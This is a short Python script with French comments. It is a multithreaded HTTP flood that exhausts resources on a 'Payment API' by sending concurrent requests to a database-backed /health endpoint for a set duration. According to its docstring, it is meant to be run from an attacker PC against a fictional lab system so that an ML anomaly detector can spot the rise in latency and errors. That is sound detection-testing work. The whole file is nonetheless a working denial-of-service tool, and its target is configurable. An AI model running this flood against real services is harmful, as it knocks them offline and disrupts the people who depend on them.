#!/usr/bin/env python3
"""Attaque principale — épuisement de ressources (flood) sur la Payment API.

À exécuter DEPUIS LE PC ATTAQUANT, uniquement contre votre SI fictif.
Effet observable : montée de la latence p95 et du taux d'erreur -> détecté par le ML.

Dépendances : aucune (bibliothèque standard uniquement).
Exemple : python3 flood.py --target http://192.168.137.1:8000 --duration 40 --concurrency 100
"""
import argparse
import threading
import time
import urllib.request

stop = threading.Event()
sent = 0
errors = 0
_lock = threading.Lock()


def worker(url: str):
    global sent, errors
    while not stop.is_set():
        try:
            urllib.request.urlopen(url, timeout=2).read()
        except Exception:
            with _lock:
                errors += 1
        with _lock:
            sent += 1


def main():
    p = argparse.ArgumentParser()
    p.add_argument("--target", default="http://192.168.137.1:8000")
    p.add_argument("--path", default="/health")   # endpoint qui touche la base -> sature
    p.add_argument("--duration", type=int, default=40)
    p.add_argument("--concurrency", type=int, default=100)
    args = p.parse_args()

    url = args.target.rstrip("/") + args.path
    print(f"[flood] {args.concurrency} threads vers {url} pendant {args.duration}s")
    threads = [threading.Thread(target=worker, args=(url,), daemon=True)
               for _ in range(args.concurrency)]
    for t in threads:
        t.start()
    time.sleep(args.duration)
    stop.set()
    time.sleep(1)
    print(f"[flood] terminé : {sent} requêtes envoyées, {errors} erreurs/timeouts")


if __name__ == "__main__":
    main()
